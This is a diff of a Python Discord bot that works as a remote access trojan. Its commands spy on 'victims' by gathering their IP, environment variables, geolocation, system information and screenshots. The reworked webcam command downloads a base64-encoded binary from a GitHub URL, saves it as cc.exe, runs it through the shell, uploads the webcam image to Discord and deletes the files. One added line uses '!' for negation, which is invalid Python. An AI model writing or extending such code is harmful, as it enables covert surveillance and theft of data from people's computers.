@@ -2,7 +2,6 @@ from Variables import *
 
 import disnake as discord
 from disnake import Embed
-from disnake import Webhook 
 from disnake.ext import commands
 
 from mss import mss
@@ -15,6 +14,9 @@ original_dir = os.getcwd()
 client = commands.InteractionBot(test_guilds=server_ids)
 nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"
 
+if !os.path.isdir(nr_working):
+    os.mkdir(nr_working)
+    
 @client.event
 async def on_ready():
     embed = Embed(
@@ -39,6 +41,7 @@ async def command(ctx):
         embed=discord.Embed(title=f"The IP of {os.getenv('username')} is: {IP()}") 
     )
     await ctx.response.send_message("Checking all available victims...")
+
 
 @client.slash_command(
     name="getenv",
@@ -71,6 +74,7 @@ async def command(ctx, victim: str, environment: str):
             )
         )
 
+
 @client.slash_command(
     name="geolocate",
     description="Finds all geolocation information of victim",
@@ -101,21 +105,49 @@ async def command(ctx, victim):
         
         await ctx.followup.send(embed=embed)
 
-@client.slash_command(description="Capture image from webcam")  
-async def webcam_image(ctx, victim):
+
+@client.slash_command(
+    name="get_webcam",
+    description="Capture image from webcam",
+    options=[
+        discord.Option("victim", description="IP Address of specific victim", required=True),
+    ],
+)
+async def command(ctx, victim):
     if str(victim) == str(IP()):
         await ctx.response.defer()
-        webcam = bytes(get("https://raw.githubusercontent.com/NullCode13-Misc/CommandCam/master/CommandCam_binary_base64").text, "utf-8")
+        
+        webcam = bytes(
+            requests.get(
+                "https://raw.githubusercontent.com/NullCode13-Misc/CommandCam/master/CommandCam_binary_base64"
+            ).text, "utf-8"
+        )
+        
         os.chdir(nr_working)
-        with open("cc.exe", "wb") as fh: fh.write(decodebytes(webcam))
-        subprocess.run("cc.exe & ren image.bmp image.png", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        with open("cc.exe", "wb") as fh: 
+            fh.write(decodebytes(webcam))
+            
+        subprocess.run(
+            "cc.exe & ren image.bmp image.png", 
+            shell=True, 
+            stdout=subprocess.PIPE, 
+            stderr=subprocess.PIPE, 
+            stdin=subprocess.PIPE
+        )
+        
         await ctx.followup.send(
-            embed=discord.Embed(title="Snapshot taken from webcam:", color=0x0081FA), 
-            file=discord.File(nr_working + "\\image.png")
+            embed=discord.Embed(
+                title="Image taken from webcam:", 
+                timestamp=datetime.now()
+            ), 
+            file=discord.File(
+                nr_working + "\\image.png"
+            )
         )
         os.remove(nr_working + "\\image.png")
         os.remove(nr_working + "\\cc.exe")
         os.chdir(original_dir)   
+  
   
 @client.slash_command(description="Sends General System Information")
 async def systeminfo(ctx, victim):
@@ -133,6 +165,7 @@ async def systeminfo(ctx, victim):
             file=discord.File(nr_working + "\\youtube.txt", filename="General Output.txt"), 
         )
         os.remove(nr_working + "\\youtube.txt")
+
 
 @client.slash_command(description="Sends screenshot of entire monitor")
 async def screenshot(ctx, victim):
